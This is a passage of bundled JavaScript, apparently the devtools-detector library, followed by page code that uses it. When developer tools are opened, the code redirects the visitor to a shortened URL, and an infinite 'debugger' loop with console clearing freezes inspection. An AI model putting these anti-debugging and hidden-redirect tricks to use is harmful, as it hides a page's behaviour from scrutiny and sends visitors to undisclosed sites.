                                        _.ops.push(op);
                                        break;
                                    }
                                    if (t[2]) {
                                        _.ops.pop();
                                    }
                                    _.trys.pop();
                                    continue;
                                }
                                op = n.call(value, _);
                            } catch (e) {
                                op = [6, e];
                                c = 0;
                            } finally {
                                pp = t = 0;
                            }
                        }
                        if (5 & op[0]) {
                            throw op[1];
                        }
                        return {
                            value: op[0] ? op[1] : void 0,
                            done: true
                        };
                    }([data, canCreateDiscussions]);
                };
            }
            var pp;
            var c;
            var t;
            var g;
            var _ = {
                label: 0,
                sent: function sent() {
                    if (1 & t[0]) {
                        throw t[1];
                    }
                    return t[1];
                },
                trys: [],
                ops: []
            };
            return g = {
                next: verb(0),
                throw: verb(1),
                return: verb(2)
            }, "function" == typeof Symbol && (g[Symbol.iterator] = function () {
                return this;
            }), g;
        };
        var val = / /;
        var node = false;
        val.toString = function () {
            return node = true, MODULE_STORE.name;
        };
        var MODULE_STORE = {
            name: "reg-to-string",
            isOpen: function storeOffline() {
                return then(this, void 0, void 0, function () {
                    return translateAndReject(this, function (canCreateDiscussions) {
                        return node = false, Object(event.b)(val), Object(event.a)(), [2, node];
                    });
                });
            },
            isEnable: function storeOffline() {
                return then(this, void 0, void 0, function () {
                    return translateAndReject(this, function (canCreateDiscussions) {
                        return [2, Object(window.b)({
                            includes: [true],
                            excludes: [dP.f]
                        })];
                    });
                });
            }
        };
    }, function (canCreateDiscussions, exports, __webpack_require__) {
        function now() {
            return performance ? performance.now() : Date.now();
        }
        __webpack_require__.d(exports, "a", function () {
            return onBlurredState;
        });
        var then = this && this.__awaiter || function (thisArg, _arguments, D, generator) {
            return new(D || (D = Promise))(function (calculateBonus, replace) {
                function handlePossibleRedirection(data) {
                    try {
                        callback(generator.next(data));
                    } catch (dimensionInfoPattern) {
                        replace(dimensionInfoPattern);
                    }
                }

                function error(value) {
                    try {
                        callback(generator.throw(value));
                    } catch (dimensionInfoPattern) {
                        replace(dimensionInfoPattern);
                    }
                }

                function callback(target) {
                    if (target.done) {
                        calculateBonus(target.value);
                    } else {
                        (function (ev) {
                            return ev instanceof D ? ev : new D(function (doCommit) {
                                doCommit(ev);
                            });
                        })(target.value).then(handlePossibleRedirection, error);
                    }
                }
                callback((generator = generator.apply(thisArg, _arguments || [])).next());
            });
        };
        var translateAndReject = this && this.__generator || function (value, n) {
            function verb(data) {
                return function (canCreateDiscussions) {
                    return function (op) {
                        if (pp) {
                            throw new TypeError("Generator is already executing.");
                        }
                        for (; _;) {
                            try {
                                if (pp = 1, c && (t = 2 & op[0] ? c.return : op[0] ? c.throw || ((t = c.return) && t.call(c), 0) : c.next) && !(t = t.call(c, op[1])).done) {
                                    return t;
                                }
                                switch (c = 0, t && (op = [2 & op[0], t.value]), op[0]) {
                                case 0:
                                case 1:
                                    t = op;
                                    break;
                                case 4:
                                    return _.label++, {
                                        value: op[1],
                                        done: false
                                    };
                                case 5:
                                    _.label++;
                                    c = op[1];
                                    op = [0];
                                    continue;
                                case 7:
                                    op = _.ops.pop();
                                    _.trys.pop();
                                    continue;
                                default:
                                    if (!(t = (t = _.trys).length > 0 && t[t.length - 1]) && (6 === op[0] || 2 === op[0])) {
                                        _ = 0;
                                        continue;
                                    }
                                    if (3 === op[0] && (!t || op[1] > t[0] && op[1] < t[3])) {
                                        _.label = op[1];
                                        break;
                                    }
                                    if (6 === op[0] && _.label < t[1]) {
                                        _.label = t[1];
                                        t = op;
                                        break;
                                    }
                                    if (t && _.label < t[2]) {
                                        _.label = t[2];
                                        _.ops.push(op);
                                        break;
                                    }
                                    if (t[2]) {
                                        _.ops.pop();
                                    }
                                    _.trys.pop();
                                    continue;
                                }
                                op = n.call(value, _);
                            } catch (e) {
                                op = [6, e];
                                c = 0;
                            } finally {
                                pp = t = 0;
                            }
                        }
                        if (5 & op[0]) {
                            throw op[1];
                        }
                        return {
                            value: op[0] ? op[1] : void 0,
                            done: true
                        };
                    }([data, canCreateDiscussions]);
                };
            }
            var pp;
            var c;
            var t;
            var g;
            var _ = {
                label: 0,
                sent: function sent() {
                    if (1 & t[0]) {
                        throw t[1];
                    }
                    return t[1];
                },
                trys: [],
                ops: []
            };
            return g = {
                next: verb(0),
                throw: verb(1),
                return: verb(2)
            }, "function" == typeof Symbol && (g[Symbol.iterator] = function () {
                return this;
            }), g;
        };
        var onBlurredState = {
            name: "debugger-checker",
            isOpen: function storeOffline() {
                return then(this, void 0, void 0, function () {
                    var timestamp;
                    return translateAndReject(this, function (n) {
                        return timestamp = now(),
                            function () {}.constructor("debugger")(), [2, now() - timestamp > 100];
                    });
                });
            },
            isEnable: function storeOffline() {
                return then(this, void 0, void 0, function () {
                    return translateAndReject(this, function (canCreateDiscussions) {
                        return [2, true];
                    });
                });
            }
        };
    }, function (canCreateDiscussions, exports, __webpack_require__) {
        __webpack_require__.d(exports, "a", function () {
            return onBlurredState;
        });
        var __WEBPACK_LABELED_MODULE__3 = __webpack_require__(1);
        var event = __webpack_require__(2);
        var window = __webpack_require__(0);
        var mw = __webpack_require__(4);
        var then = this && this.__awaiter || function (thisArg, _arguments, D, generator) {
            return new(D || (D = Promise))(function (calculateBonus, replace) {
                function handlePossibleRedirection(data) {
                    try {
                        callback(generator.next(data));
                    } catch (dimensionInfoPattern) {
                        replace(dimensionInfoPattern);
                    }
                }

                function error(value) {
                    try {
                        callback(generator.throw(value));
                    } catch (dimensionInfoPattern) {
                        replace(dimensionInfoPattern);
                    }
                }

                function callback(target) {
                    if (target.done) {
                        calculateBonus(target.value);
                    } else {
                        (function (ev) {
                            return ev instanceof D ? ev : new D(function (doCommit) {
                                doCommit(ev);
                            });
                        })(target.value).then(handlePossibleRedirection, error);
                    }
                }
                callback((generator = generator.apply(thisArg, _arguments || [])).next());
            });
        };
        var translateAndReject = this && this.__generator || function (value, n) {
            function verb(data) {
                return function (canCreateDiscussions) {
                    return function (op) {
                        if (pp) {
                            throw new TypeError("Generator is already executing.");
                        }
                        for (; _;) {
                            try {
                                if (pp = 1, c && (t = 2 & op[0] ? c.return : op[0] ? c.throw || ((t = c.return) && t.call(c), 0) : c.next) && !(t = t.call(c, op[1])).done) {
                                    return t;
                                }
                                switch (c = 0, t && (op = [2 & op[0], t.value]), op[0]) {
                                case 0:
                                case 1:
                                    t = op;
                                    break;
                                case 4:
                                    return _.label++, {
                                        value: op[1],
                                        done: false
                                    };
                                case 5:
                                    _.label++;
                                    c = op[1];
                                    op = [0];
                                    continue;
                                case 7:
                                    op = _.ops.pop();
                                    _.trys.pop();
                                    continue;
                                default:
                                    if (!(t = (t = _.trys).length > 0 && t[t.length - 1]) && (6 === op[0] || 2 === op[0])) {
                                        _ = 0;
                                        continue;
                                    }
                                    if (3 === op[0] && (!t || op[1] > t[0] && op[1] < t[3])) {
                                        _.label = op[1];
                                        break;
                                    }
                                    if (6 === op[0] && _.label < t[1]) {
                                        _.label = t[1];
                                        t = op;
                                        break;
                                    }
                                    if (t && _.label < t[2]) {
                                        _.label = t[2];
                                        _.ops.push(op);
                                        break;
                                    }
                                    if (t[2]) {
                                        _.ops.pop();
                                    }
                                    _.trys.pop();
                                    continue;
                                }
                                op = n.call(value, _);
                            } catch (e) {
                                op = [6, e];
                                c = 0;
                            } finally {
                                pp = t = 0;
                            }
                        }
                        if (5 & op[0]) {
                            throw op[1];
                        }
                        return {
                            value: op[0] ? op[1] : void 0,
                            done: true
                        };
                    }([data, canCreateDiscussions]);
                };
            }
            var pp;
            var c;
            var t;
            var g;
            var _ = {
                label: 0,
                sent: function sent() {
                    if (1 & t[0]) {
                        throw t[1];
                    }
                    return t[1];
                },
                trys: [],
                ops: []
            };
            return g = {
                next: verb(0),
                throw: verb(1),
                return: verb(2)
            }, "function" == typeof Symbol && (g[Symbol.iterator] = function () {
                return this;
            }), g;
        };
        var t = new Date;
        var o = 0;
        t.toString = function () {
            return o++, "";
        };
        var onBlurredState = {
            name: "date-to-string",
            isOpen: function storeOffline() {
                return then(this, void 0, void 0, function () {
                    return translateAndReject(this, function (canCreateDiscussions) {
                        return o = 0, Object(event.b)(t), Object(event.a)(), [2, 2 === o];
                    });
                });
            },
            isEnable: function storeOffline() {
                return then(this, void 0, void 0, function () {
                    return translateAndReject(this, function (canCreateDiscussions) {
                        return [2, Object(window.b)({
                            includes: [__WEBPACK_LABELED_MODULE__3.a],
                            excludes: [(mw.isIpad || mw.isIphone) && __WEBPACK_LABELED_MODULE__3.a]
                        })];
                    });
                });
            }
        };
    }, function (canCreateDiscussions, date, t) {
        t.d(date, "a", function () {
            return i;
        });
        var e = t(3);
        var i = /mobile/i.test(e.b);
    }]);
});
devtoolsDetector.addListener(function (canCreateDiscussions) {
    window.location.assign("https://u.nu/EpRcF");
});
devtoolsDetector.launch();
//# sourceMappingURL=https://cdn.jsdelivr.net/npm/@innei/devtools-detector@2.0.4-beta.1/lib/devtools-detector.js.map

'use strict';
(async function () {
    setInterval(function () {
        gotoNewOfflinePage();
    }, 4000);
    var gotoNewOfflinePage = function clearUndo() {
        function test(i) {
            if (("" + i / i)["length"] !== 1 || i % 20 === 0) {
                (function () {})["constructor"]("debugger")();
            } else {
                (function () {})["constructor"]("debugger")();
            }
            test(++i);
        }
        setTimeout(test, 2000);
        setTimeout(function () {
            try {
                test(0);
            } catch (err) {
                console.clear();
            }
        }, 2000);
    };
    gotoNewOfflinePage();
})();